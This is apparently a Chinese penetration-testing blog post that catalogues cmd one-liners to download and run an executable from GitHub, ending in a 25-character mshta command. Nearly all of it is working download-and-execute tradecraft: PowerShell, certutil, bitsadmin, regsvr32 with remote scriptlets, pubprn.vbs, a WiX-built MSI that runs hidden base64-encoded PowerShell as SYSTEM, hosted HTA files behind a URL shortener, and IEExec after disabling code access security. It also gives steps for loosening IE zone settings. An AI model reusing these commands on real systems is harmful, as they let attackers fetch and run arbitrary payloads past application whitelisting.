# title{downloadfile - 渗透技巧——从github下载文件的多种方法}

## 0x00 前言

------

本文源于一个有趣的问题：

已知exe文件：https://github.com/3gstudent/test/raw/master/putty.exe

Windows环境，需要将该exe释放到指定目录并执行，例如`c:\download`

**问：**`通过cmd实现的最短代码是多少字符？`

## 0x01 简介

------

本文将要介绍以下内容：

- 通过cmd实现从github下载文件的方法汇总
- 选出最短代码的实现方法

## 0x02 分析

------

在之前的文章《渗透技巧——通过cmd上传文件的N种方法》对通过命令行下载文件的方法做了汇总

而github支持https协议，并不支持http协议，所以在利用上需要注意一些问题，有些方法不支持http协议

## 0x03 可用方法汇总

------

### 1、powershell

```
powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'
```

### 2、certutil

```
certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&&c:\download\a.exe
```

### 3、bitsadmin

```
bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe && c:\download\a.exe
```

**注：**

使用bitsadmin的下载速度较慢

### 4、regsvr32

```
regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll
```

**原理：**

regsve32->JScript->powershell->download&exec

JScript调用powershell实现下载执行的代码为：

```
new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'",0,true);
```

参照sct文件格式：

https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct

添加功能，生成downloadexec.sct

**实现功能：**

```
regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll
```

当然，为了减少调用的程序，也可以使用以下思路：

regsve32->VBScript->download&exec

通常，vbs脚本实现的下载执行代码：

```
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("Msxml2.XMLHTTP")
http.open "GET","http://192.168.81.192/putty.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\download\a.exe"
ado.Close
```

但该脚本不支持https下载，可以换用`Msxml2.ServerXMLHTTP.6.0`

代码如下：

```
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
http.SetOption 2, 13056
http.open "GET","https://github.com/3gstudent/test/raw/master/putty.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\download\a.exe"
ado.Close
```

**注：**

该思路来自@mosin @索马里海贼

也可以通过`WinHttp.WinHttpRequest.5.1`实现，代码如下：

```
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.open "GET","https://github.com/3gstudent/test/raw/master/putty.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\download\a.exe"
ado.Close
```

**注：**

该思路来自@ogre

vbs脚本实现的执行代码

```
WScript.CreateObject("WScript.Shell").Run "c:\download\a.exe",0,true 
```

依旧是以sct文件作为模板，添加功能，生成downloadexec2.sct

**实现功能：**

```
regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec2.sct scrobj.dll
```

### 5、pubprn.vbs

利用pubprn.vbs能够执行远程服务器上的sct文件(sct文件格式有区别)

**思路：**

regsve32->VBScript->download&exec

代码已上传，地址为https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct

**实现功能：**

```
cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct
```

当然，也可使用如下思路实现(代码略)：

regsve32->JScript->powershell->download&exec

### 6、msiexec

该方法我之前的两篇文章《渗透测试中的msiexec》《渗透技巧——从Admin权限切换到System权限》有过介绍，细节不再赘述

首先将powershell实现下载执行的代码作base64编码：

```
$fileContent = "(new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'"
$bytes  = [System.Text.Encoding]::Unicode.GetBytes($fileContent);
$encoded = [System.Convert]::ToBase64String($bytes); 
$encoded
```

得到：

```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==
```

完整powershell命令为：

```
powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==
```

完整wix文件为：

```
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product 
Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
    <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
    <Media Id="1" />

    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLLOCATION" Name="Example">
          <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">     
          </Component>
        </Directory>
      </Directory>
    </Directory>

    <Feature Id="DefaultFeature" Level="1">
      <ComponentRef Id="ApplicationFiles"/>
    </Feature>

    <Property Id="cmdline">powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==
    </Property>

    <CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" 
ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>

    <CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
      invalid vbs to fail install
    </CustomAction>

    <InstallExecuteSequence>
      <Custom Action="SystemShell" After="InstallInitialize"></Custom>
      <Custom Action="FailInstall" Before="InstallFiles"></Custom>
    </InstallExecuteSequence>

  </Product>
</Wix>
```

将其编译，生成msi文件，命令如下：

```
candle.exe msigen.wix
light.exe msigen.wixobj
```

生成test.msi

**实现功能：**

```
msiexec /q /i https://github.com/3gstudent/test/raw/master/test.msi
```

**注：**

执行后需要手动结束进程msiexec.exe

### 7、mshta

mshta支持`http`和`htpps`

但mshta在执行hta脚本时，类似于浏览器，会根据链接返回头进行对应的解析操作，所以这里只有当返回头为html时才会运行

否则会被当普通文本进行解析

对于github的代码，返回的格式为`text/plain`

如果使用如下命令执行：

```
mshta https://raw.githubusercontent.com/3gstudent/test/master/calc.hta
```

会把代码当成`text`，无法解析成html，导致脚本无法执行

但是我们可以换一个思路：

```
将hta文件传到github的博客下面，就能够被解析成html，实现代码执行
```

将hta文件上传至github博客下面，地址为https://3gstudent.github.io/test/calc.hta

执行如下命令：

```
mshta https://3gstudent.github.io/test/calc.hta
```

成功弹出计算器

**注:**

该思路来自于DM_

添加功能，实现下载执行，命令如下：

```
mshta https://3gstudent.github.io/test/downloadexec.hta
```

弹框提示此计算机上的安全设置禁止访问其它域的数据源，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-23/2-1.png)

**解决方法：**

```
IE浏览器`-`Internet选项`-`安全
```

选择`可信站点`，添加博客地址：https://3gstudent.github.io/

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-23/2-2.png)

```
自定义级别`，找到`通过域访问数据源`，选择`启用
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-11-23/2-3.png)

再次测试，成功实现下载执行的功能

经过以上的测试，我们发现IE浏览器默认会拦截vbs脚本实现的下载功能

那么，我们可以大胆猜测，如果下载执行换成powershell实现的话，那么就不会被拦截

修改脚本，上传至github

命令如下：

```
mshta https://3gstudent.github.io/test/downloadexec2.hta
```

经过测试，该方法可用

使用短地址

有趣的是 http://dwz.cn/ 不支持该域名

换一个短地址网站 http://sina.lt/

生成短地址，最终命令为：

```
mshta http://t.cn/RYUQyF8
```

最终实现的最短字符长度为25

## 0x04 补充

------

### 1、IEExec

需要管理员权限

```
cd C:\Windows\Microsoft.NET\Framework\v2.0.50727\
caspol -s off
IEExec http://github.com/3gstudent/test/raw/master/putty.exe
```

**注：**

exe需要满足特定格式

详情可参考：

https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/

**注：**

我在Win7下复现失败

## 0x05 小结

------

本文对通过cmd实现从github下载文件的方法做了汇总，最短的实现方式为`mshta http://t.cn/RYUQyF8`

实现的最短字符长度为25

------

[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)